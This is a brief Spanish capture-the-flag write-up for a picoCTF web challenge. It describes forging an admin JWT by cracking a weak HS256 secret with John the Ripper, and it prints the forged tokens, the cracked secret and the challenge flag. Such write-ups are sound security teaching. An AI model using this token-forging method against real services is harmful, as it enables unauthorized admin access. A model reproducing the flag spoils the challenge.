## Objetivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864
## Solución
```
Obtenemos el JWT usando las cookies y lo modificamos con la palabra admin:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.DBufU4O4JNnrZDSNbcVolaii8w1fL-h7UpoGQke0ILI
Luego usando john the ripper sacamos el paswword seguro y se lo añadimos al JWT:
ilovepico
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
Finalmente guardamos la cookie, recargamos y nos arroja la bandera:
picoCTF{jawt_was_just_what_you_thought_1ca14548}
```
## Notas adicionales
## Referencias
https://github.com/openwall/john